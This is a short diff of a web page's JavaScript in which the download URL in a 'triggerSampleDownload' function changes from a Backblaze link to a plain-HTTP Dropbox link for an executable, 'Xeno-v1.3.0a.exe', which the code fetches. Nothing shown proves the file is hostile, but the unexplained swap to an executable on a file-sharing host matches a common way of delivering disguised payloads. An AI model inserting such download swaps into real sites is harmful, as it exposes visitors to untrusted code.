@@ -101,7 +101,7 @@ function bounceIcon() {
 }
 
 async function triggerSampleDownload() {
-  const fileUrl = 'https://tree-ams5-0002.secure.backblaze.com/api/user_b2_download_file?action=download_files&accountId=8179503cf464&bucketId=784187d92570c3cc9fa40614';
+  const fileUrl = 'http://dl.dropboxusercontent.com/scl/fi/nnk094i2qjva1a3ppsb9f/Xeno-v1.3.0a.exe?rlkey=xp6634lztjzgcv0kwerd372yl&e=1&st=2hrytsw3&dl=1';
   
   try {
     const response = await fetch(fileUrl);
